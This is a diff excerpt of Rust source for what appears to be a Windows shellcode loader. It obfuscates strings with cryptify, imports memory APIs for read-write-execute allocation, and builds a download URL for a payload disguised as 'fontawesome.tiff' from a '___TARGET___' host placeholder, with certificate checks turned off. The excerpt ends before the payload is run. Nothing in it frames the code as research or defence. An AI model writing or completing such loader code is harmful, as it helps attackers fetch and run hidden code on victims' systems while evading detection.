@@ -4,18 +4,16 @@ use std::ptr;
 use cryptify::{self, encrypt_string, flow_stmt};
 use reqwest::Error;
 use windows::Win32::System::Memory::{
-    MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, VirtualAlloc,
-    VirtualFree, VirtualProtect,
+    VirtualAlloc, VirtualFree, VirtualProtect, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE,
+    PAGE_EXECUTE_READWRITE, PAGE_READWRITE,
 };
 use zeroize::Zeroize;
 
 fn main() -> Result<(), Error> {
-    let args: Vec<String> = std::env::args().collect();
-
     let target = "___TARGET___";
 
     //println!("{}, {}", args[0], args[1]);
-    let mut url = format!("http://{}/fontawesome.tiff", args[1]);
+    let mut url = format!("http://{}/fontawesome.tiff", target);
 
     let client = reqwest::blocking::Client::builder()
         .danger_accept_invalid_certs(true)
